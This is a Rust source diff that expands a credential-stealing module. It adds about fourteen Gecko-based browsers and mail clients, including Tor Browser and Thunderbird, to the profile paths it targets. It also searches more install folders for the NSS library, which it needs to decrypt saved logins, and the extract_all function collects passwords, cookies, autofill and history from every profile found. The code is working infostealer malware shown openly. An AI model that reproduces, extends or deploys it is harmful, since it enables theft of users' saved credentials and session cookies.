@@ -10,6 +10,7 @@ struct GeckoBrowserInfo {
 
 fn get_browsers() -> Vec<GeckoBrowserInfo> {
     let roaming = env::var("APPDATA").unwrap_or_default();
+    let local = env::var("LOCALAPPDATA").unwrap_or_default();
 
     vec![
         GeckoBrowserInfo {
@@ -17,26 +18,101 @@ fn get_browsers() -> Vec<GeckoBrowserInfo> {
             profiles_path: PathBuf::from(&roaming).join("Mozilla").join("Firefox").join("Profiles"),
         },
         GeckoBrowserInfo {
+            name: "Firefox ESR",
+            profiles_path: PathBuf::from(&roaming).join("Mozilla").join("Firefox ESR").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "Firefox Developer",
+            profiles_path: PathBuf::from(&roaming)
+                .join("Mozilla")
+                .join("Firefox Developer Edition")
+                .join("Profiles"),
+        },
+        GeckoBrowserInfo {
             name: "Waterfox",
             profiles_path: PathBuf::from(&roaming).join("Waterfox").join("Profiles"),
         },
         GeckoBrowserInfo {
+            name: "Waterfox G5",
+            profiles_path: PathBuf::from(&roaming).join("Waterfox").join("Waterfox").join("Profiles"),
+        },
+        GeckoBrowserInfo {
             name: "LibreWolf",
             profiles_path: PathBuf::from(&roaming).join("librewolf").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "PaleMoon",
+            profiles_path: PathBuf::from(&roaming)
+                .join("Moonchild Productions")
+                .join("Pale Moon")
+                .join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "Basilisk",
+            profiles_path: PathBuf::from(&roaming)
+                .join("Moonchild Productions")
+                .join("Basilisk")
+                .join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "SeaMonkey",
+            profiles_path: PathBuf::from(&roaming).join("Mozilla").join("SeaMonkey").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "Floorp",
+            profiles_path: PathBuf::from(&roaming).join("Floorp").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "Thunderbird",
+            profiles_path: PathBuf::from(&roaming).join("Thunderbird").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "Tor Browser",
+            profiles_path: PathBuf::from(&local)
+                .join("Tor Browser")
+                .join("Browser")
+                .join("TorBrowser")
+                .join("Data")
+                .join("Browser"),
+        },
+        GeckoBrowserInfo {
+            name: "K-Meleon",
+            profiles_path: PathBuf::from(&roaming).join("K-Meleon").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "IceDragon",
+            profiles_path: PathBuf::from(&roaming).join("Comodo").join("IceDragon").join("Profiles"),
+        },
+        GeckoBrowserInfo {
+            name: "Cyberfox",
+            profiles_path: PathBuf::from(&roaming).join("8pecxstudios").join("Cyberfox").join("Profiles"),
         },
     ]
 }
 
 // ── Firefox installation discovery ─────────────────────────────────────────
 
-fn find_firefox_dir() -> Option<PathBuf> {
+fn find_nss_dir() -> Option<PathBuf> {
+    let pf = env::var("ProgramFiles").unwrap_or_default();
+    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
     let candidates = [
-        PathBuf::from(r"C:\Program Files\Mozilla Firefox"),
-        PathBuf::from(r"C:\Program Files (x86)\Mozilla Firefox"),
+        PathBuf::from(&pf).join("Mozilla Firefox"),
+        PathBuf::from(&pf86).join("Mozilla Firefox"),
+        PathBuf::from(&pf).join("Waterfox"),
+        PathBuf::from(&pf86).join("Waterfox"),
+        PathBuf::from(&pf).join("LibreWolf"),
+        PathBuf::from(&pf86).join("LibreWolf"),
+        PathBuf::from(&pf).join("Pale Moon"),
+        PathBuf::from(&pf86).join("Pale Moon"),
+        PathBuf::from(&pf).join("Moonchild Productions").join("Pale Moon"),
+        PathBuf::from(&pf).join("Floorp"),
+        PathBuf::from(&pf86).join("Floorp"),
+        PathBuf::from(&pf).join("SeaMonkey"),
+        PathBuf::from(&pf86).join("SeaMonkey"),
     ];
-    for p in &candidates {
+    for p in candidates {
         if p.join("nss3.dll").exists() {
-            return Some(p.clone());
+            return Some(p);
         }
     }
     None
@@ -414,7 +490,7 @@ fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
 
 pub fn extract_all() -> Vec<(String, String)> {
     let mut results = Vec::new();
-    let firefox_dir = find_firefox_dir();
+    let firefox_dir = find_nss_dir();
 
     for browser in get_browsers() {
         if !browser.profiles_path.exists() {
@@ -437,8 +513,8 @@ pub fn extract_all() -> Vec<(String, String)> {
                 &profile_name,
                 passwords,
                 cookies,
-                history,
                 autofill,
+                history,
             );
         }
     }
